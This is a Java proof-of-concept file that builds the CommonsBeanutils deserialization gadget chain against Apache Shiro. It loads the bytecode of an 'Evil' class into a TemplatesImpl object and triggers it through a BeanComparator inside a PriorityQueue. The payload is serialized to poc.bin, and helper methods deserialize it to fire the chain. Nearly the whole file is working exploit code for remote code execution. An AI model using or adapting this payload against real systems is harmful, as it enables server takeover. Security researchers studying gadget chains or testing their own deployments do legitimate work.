package POC_macker.CBShiro;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.apache.commons.beanutils.BeanComparator;

import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;


public class CommomsBeanutilsShiro {
    public static PriorityQueue getPayloadObject() throws Exception {
        return get_PriorityQueue(
                get_BeanComparator(), get_TemplatesImpl(
                        get_Evil_clazz(Evil.class)
                )
        );
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static CtClass get_Evil_clazz(Class Class) throws NotFoundException {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(Class.getName());
        return clazz;
    }

    public static TemplatesImpl get_TemplatesImpl(CtClass clazz) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{clazz.toBytecode()});
        setFieldValue(templates, "_name", "HelloTemplatesImpl");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
//        templates.newTransformer();
//        PropertyUtils.getProperty(templates,"outputProperties");
        return templates;
    }


    public static BeanComparator get_BeanComparator() throws Exception {
        BeanComparator beanComparator = new BeanComparator("outputProperties", new AttrCompare());
        System.out.println("已选择使用AttrCompare构造BeanComparator，无需CC依赖");
//        BeanComparator beanComparator = new BeanComparator();
//        System.out.println("使用默认构造函数创建BeanComparator，需要CC依赖");
        setFieldValue(beanComparator,"property","outputProperties");
//        beanComparator.compare(templates,1);
        return beanComparator;
    }

    public static PriorityQueue get_PriorityQueue(BeanComparator beanComparator, TemplatesImpl templates) throws Exception {
        PriorityQueue priorityQueue = new PriorityQueue();
        setFieldValue(priorityQueue,"comparator",beanComparator);
        setFieldValue(priorityQueue,"size",2);
        Object[] ints = {templates,templates};
        setFieldValue(priorityQueue,"queue",ints);
//        priorityQueue.poll();
        return priorityQueue;
    }

    public static byte[] get_ObjectToByteArray(Object object) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(object);
        objectOutputStream.close();
        return byteArrayOutputStream.toByteArray();
    }
    public static void serialize(Object object,String name) throws IOException {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(name));
        objectOutputStream.writeObject(object);
        objectOutputStream.flush();
        objectOutputStream.close();
    }
    public static void serialize(Object object) throws IOException {
        serialize(object,"./poc.bin");
    }


    public static void unserialize(String name) throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(name));
//        想要测试的话注释掉下面的反序列化函数readObject即可
        Object get_object = objectInputStream.readObject();
    }
    public static void unserialize() throws IOException, ClassNotFoundException {
        unserialize("./poc.bin");
    }
}
